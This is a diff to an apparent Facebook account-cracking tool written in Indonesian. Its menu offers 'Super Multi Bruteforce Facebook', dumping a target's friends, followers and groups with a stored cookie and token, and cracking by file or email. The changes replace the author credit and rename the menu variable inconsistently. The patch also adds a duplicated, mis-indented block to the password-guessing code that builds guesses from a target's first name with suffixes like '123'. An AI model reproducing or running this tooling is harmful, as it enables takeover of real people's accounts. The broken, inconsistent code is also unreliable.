@@ -153,28 +153,28 @@ def menu():
 	print(f'\x1b[1;97m┌─Nama  : {h}%s'%(nama))
 	print(f'\x1b[1;97m├─Idz   :{h} '+str(uidfb))
 	print(f'\x1b[1;97m├─Ip    :{h} {ip}\x1b[1;97m')
-	print(f'└─\x1b[1;97mAuthor\x1b[1;97m: [{h}LuciverXploit\x1b[1;97m] ')
+	print(f'└─\x1b[1;97mAuthor\x1b[1;97m: [{h}Aryashule\x1b[1;97m] ')
 	print('')
 	ler()
 	print(f'┌─[{h}1\x1b[1;97m] Super Multi Bruteforce Facebook ')
 	print(f'\x1b[1;97m├─[{h}2\x1b[1;97m] Crack Hasil Eror')
 	print(f'\x1b[1;97m└─[{h}0\x1b[1;97m] Back       ')
-	_____luciver__xploit_____ = input(f'\n└───➢ Pilih : ')
-	if _____luciver__xploit_____ in ['1']:
+	_____arya__phutra_____ = input(f'\n└───➢ Pilih : ')
+	if _____arya__phutra_____ in ['1']:
 	        idt = input('\n┌─➢ ID Target : ')
 	        dump(idt,"",{"cookie":cok},token)
 	        setting()
-	elif _____luciver__xploit_____ in ['6']:
+	elif _____arya__shule_____ in ['6']:
 		dump_follower()
-	elif _____luciver__xploit_____ in ['3']:
+	elif _____arya__shule_____ in ['3']:
 		grup()
-	elif _____luciver__xploit_____ in ['4']:
+	elif _____arya__shule_____ in ['4']:
 		crack_file()
-	elif _____luciver__xploit_____ in ['5']:
+	elif _____arya__shule_____ in ['5']:
 		crack_email()
-	elif _____luciver__xploit_____ in ['2']:
+	elif _____arya__shule_____ in ['2']:
 		result()
-	elif _____luciver__xploit_____ in ['0']:
+	elif _____arya__shule_____ in ['0']:
 		os.system('rm -rf .token.txt')
 		os.system('rm -rf .cookie.txt')
 		print('➢ Sukses Logout+Hapus Kukis ')
@@ -291,6 +291,10 @@ def passwrd():
 				if len(frs)<3:
 					pass
 				else:
+				if len(frs)<3:
+					pwv.append(nmf)
+				else:
+					pwv.append(nmf)
 					pwv.append(frs+'123')
 					pwv.append(frs+'1234')
 					pwv.append(frs+'a')
